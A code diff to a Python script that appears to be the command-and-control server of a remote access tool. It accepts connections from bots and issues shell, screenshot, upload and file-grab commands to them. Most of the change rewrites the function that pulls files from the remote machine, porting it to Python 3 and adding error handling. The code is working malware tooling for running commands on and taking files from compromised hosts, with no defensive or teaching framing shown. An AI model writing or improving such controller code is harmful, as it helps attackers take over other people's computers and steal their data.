@@ -10,7 +10,6 @@ import sys
 
 
 
-
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -48,7 +47,7 @@ def session(conn):
 	print ("\n")
 
 	while True:
-		command=input("bot>")
+		command=input("client>")
 		if 'exit' in command:
 			print ("\n BACK TO MOTHERSHIP \n")
 			return
@@ -92,6 +91,7 @@ def session(conn):
 		elif 'shell*' in command:
 			try:
 				conn.send(command.encode())
+
 				shell=conn.recv(1024).decode()
 				if shell.startswith("COMMAND_NOT_FOUND"):
 					print("command not found")
@@ -255,35 +255,39 @@ def screenshot(conn,command):
     imageno+=1
 
 def transfergrab(conn,command):
-    
-    conn.send(command)
-    grab,filename=command.split('*')
-    path=os.getcwd()+"/"
-    path += filename
-    
-    bits=conn.recv(1024)
-    if "The File Doesn't Exist" in bits:
-        
-        print(Fore.RED)
-        print("[-]The File Doesn't Exist")   
-        print(Style.RESET_ALL)
-            
-    else:
-        f=open(path,'wb+')
-        while True:
-            f.write(bits)
-                
-            if bits.endswith('DONE'):
-                print(Fore.GREEN)
-                print("[+]File Transfer Complete")   
-                print(Style.RESET_ALL)
-                
-                f.close()
-                break
-            bits=conn.recv(1024)            
-            
+	conn.send(command.encode())
+	grab,filename=command.split('*')
+	path=os.getcwd()+"/"
+	path += filename
+	bits=conn.recv(1024)
+	msg=bits.decode()
+	if "The File Doesn't Exist" in msg:
 
-            
+		print(Fore.RED)
+		print("[-]The File Doesn't Exist")   
+		print(Style.RESET_ALL)
+
+	elif "ERROR" in msg:
+		print(Fore.RED)
+		print("[-]Some error occured at remote host")
+		print(Style.RESET_ALL)
+
+	else:
+		f=open(path,'wb+')
+		while True:
+				f.write(bits)
+				bits=conn.recv(1024)
+				msg=bits.decode()
+				if "DONE" in msg:
+					print(Fore.GREEN)
+					print("[+]File Transfer Complete")   
+					print(Style.RESET_ALL)
+					f.close()
+					break
+
+
+
+
 def transferupload(conn,command):
     print(Fore.YELLOW)
     print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
